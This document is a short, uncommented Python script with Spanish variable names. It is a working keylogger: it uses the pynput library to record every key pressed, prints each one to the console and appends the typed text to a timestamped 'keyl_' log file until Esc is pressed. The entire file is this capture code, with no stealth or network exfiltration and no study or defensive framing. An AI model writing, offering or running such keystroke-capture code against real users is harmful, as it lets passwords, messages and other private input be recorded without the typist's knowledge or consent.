from pynput import keyboard
from io import open
import datetime
Fecha_hoy = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
milista = []
file_name="keyl_"+str(Fecha_hoy)+".txt"

def savekey_txt(mkey:str,sp=0):
    print(mkey)
    print(str(sp))
    
    msg= ""
##    if sp==1:
##        msg+="Special Char:"
##    else:
##        msg+="Alpha char:"
##    msg+=mkey
    try:
        if mkey == "Key.enter":
            msg+="\n"
        elif mkey == "Key.space":
            msg+=" "
        elif mkey == "Key.backspace":
            msg+="%BORRAR%"
        else:
            msg+=mkey
            
        with open(file_name, mode="a",encoding="utf-8") as f:
            f.write(msg)
    except Exception as e:
        print(e)
        
        

    return
def on_press(key):
    is_specialchar=0
    try:
        mkey =key.char
    except AttributeError:        
        mkey=str(key)
        is_specialchar=1
    savekey_txt(mkey,is_specialchar)

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        #keyboard.Listener.stop
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
